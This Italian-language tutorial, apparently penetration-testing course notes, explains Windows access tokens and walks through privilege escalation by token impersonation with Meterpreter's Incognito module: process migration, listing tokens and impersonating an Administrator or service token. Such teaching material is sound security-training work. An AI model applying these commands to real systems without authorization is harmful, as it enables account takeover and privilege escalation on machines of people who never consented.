# Access Token Impersonation

## Cos'è un Access Token in Windows?

Gli **Access Token** in Windows sono elementi fondamentali del meccanismo di autenticazione e autorizzazione. Vengono generati dal **LSASS** (Local Security Authority Subsystem Service), processo visibile nel Task Manager come `lsass.exe`.

Un token di accesso può essere immaginato come una "chiave temporanea" che identifica l’utente autenticato e definisce i suoi privilegi. È simile ai cookie nel web: una volta autenticato, il token viene associato a ogni processo dell’utente per accedere a risorse e servizi di sistema, evitando di inserire continuamente le credenziali.

Quando un utente effettua il login, il processo `winlogon.exe` crea un token che viene ereditato dal processo `userinit.exe`. Tutti i processi figli creati da `userinit` erediteranno il token, eseguendosi con i medesimi privilegi.  
Esempio: se un utente apre il prompt dei comandi, questo verrà eseguito con il token associato al suo login.

I token possono essere di due tipi principali:

- **Token Delegate**: creati durante login interattivi (come accesso fisico o via RDP). Permettono accesso completo a risorse remote.
- **Token Impersonate**: generati da servizi per eseguire operazioni a nome dell’utente. Consentono accesso limitato, spesso locale.

## Differenze tra Token Delegate e Impersonate

- Un **Delegate Token** consente l’utilizzo di credenziali complete, permettendo l’accesso a risorse di rete. È quindi più pericoloso in caso di attacchi.
- Un **Impersonate Token** consente di impersonare localmente un utente, ma non può essere usato per connessioni remote.

## Privilegi necessari per l’Access Token Impersonation

Alcuni privilegi devono essere presenti per attuare questa tecnica:

`SeAssignPrimaryTokenPrivilege` ⟶ consente di assegnare token primari ai processi. <br>
`SeCreateTokenPrivilege` ⟶ permette di creare token arbitrari. <br>
`SeImpersonatePrivilege` ⟶ abilita la creazione di processi con il contesto di sicurezza di un altro utente. <br>

Verifica con:

`getprivs` ⟶ elenca i privilegi dell'utente attuale. <br>

## Uso del modulo Incognito in Meterpreter

`Incognito` è un’estensione integrata in Meterpreter (in passato standalone) che permette di elencare e impersonare token di accesso disponibili nella memoria del sistema.

### Fasi pratiche

#### 1. Ottenere una sessione Meterpreter con permessi limitati

Eseguiamo un attacco e otteniamo una sessione non amministrativa.

#### 2. Migrare nel processo explorer (se possibile)

`pgrep explorer` ⟶ individua il PID del processo explorer.exe. <br>
`migrate <PID>` ⟶ tenta di migrare la sessione nel processo explorer. <br>

Questa migrazione non è sempre possibile con utenti limitati.

#### 3. Verificare i privilegi disponibili

`getprivs` ⟶ se è presente `SeImpersonatePrivilege`, possiamo procedere con l’impersonificazione. <br>

#### 4. Caricare il modulo Incognito

`load incognito` ⟶ carica il modulo Incognito nella sessione Meterpreter. <br>

#### 5. Visualizzare i token disponibili

`list_tokens -u` ⟶ mostra la lista di token disponibili per l’impersonificazione. <br>

Se troviamo ad esempio `ATTACKDEFENSE\\Administrator` o `NT AUTHORITY\\LOCAL SERVICE`, possiamo provare a impersonarli.

#### 6. Impersonare un token

`impersonate_token "<TOKEN>"` ⟶ impersonifica il token selezionato. <br>
`getuid` ⟶ mostra l’identità utente corrente, che dovrebbe ora essere elevata. <br>

#### 7. Verifica dei nuovi privilegi

`getprivs` ⟶ verifica i privilegi disponibili dopo l’impersonificazione. <br>

Possiamo anche rieseguire `list_tokens -u` per vedere se possiamo impersonare altri token con privilegi ancora superiori.

## Nota sull’importanza del privilegio SeImpersonatePrivilege

Senza il privilegio `SeImpersonatePrivilege`, non è possibile completare questa tecnica. È essenziale che l’utente attaccato ne disponga.

## E se non ci sono token disponibili?

Quando non ci sono token disponibili da impersonare, possiamo usare tecniche alternative come l’**attacco Potato**, che sfrutta vulnerabilità o errate configurazioni nei privilegi di rete e pipe di sistema.
